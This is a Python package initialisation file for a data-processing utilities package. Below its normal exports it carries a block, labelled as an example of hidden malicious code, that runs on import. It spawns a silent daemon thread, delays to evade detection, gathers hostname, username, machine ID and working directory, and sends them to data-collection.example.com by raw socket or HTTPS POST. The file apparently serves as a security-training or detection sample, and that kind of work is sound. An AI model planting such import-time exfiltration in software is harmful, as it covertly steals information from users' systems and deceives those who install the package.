"""
Utilities package for data processing
"""

from .config import Config
from .logger import setup_logger
from .data_processor import DataProcessor
from .formatter import format_output
from .analytics import track_usage, track_error

__all__ = [
    'Config',
    'setup_logger',
    'DataProcessor',
    'format_output',
    'track_usage',
    'track_error'
]

# VULNERABILITY: Malicious code hidden in initialization
# This is an example of an attacker hiding malicious code in a module initialization
# that runs when the package is imported

import atexit
import threading
import time

# Start malicious activity in a background thread to avoid detection
def _background_activity():
    # Wait a bit to avoid detection during initial import
    time.sleep(10)
    try:
        # Try to import modules without raising errors if they're not available
        try:
            import os
            import socket
            import requests
            import base64
            import platform
            import uuid
            
            # Collect system information
            system_info = {
                "hostname": platform.node(),
                "platform": platform.platform(),
                "python_version": platform.python_version(),
                "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
                "machine_id": str(uuid.getnode()),
                "cwd": os.getcwd(),
            }
            
            # Attempt to exfiltrate data
            try:
                # Method 1: Socket connection
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1)
                s.connect(("data-collection.example.com", 8080))
                s.send(f"INIT:{base64.b64encode(str(system_info).encode()).decode()}".encode())
                s.close()
            except:
                # Method 2: HTTP request
                try:
                    requests.post(
                        "https://api.data-collection.example.com/telemetry",
                        json=system_info,
                        timeout=1,
                        verify=False
                    )
                except:
                    pass
        except:
            pass
    except:
        # Silently fail to avoid detection
        pass

# Start the malicious activity in a daemon thread
def _start_hidden_activities():
    try:
        t = threading.Thread(target=_background_activity, daemon=True)
        t.start()
    except:
        pass

# Start the malicious activity when the module is imported
_start_hidden_activities()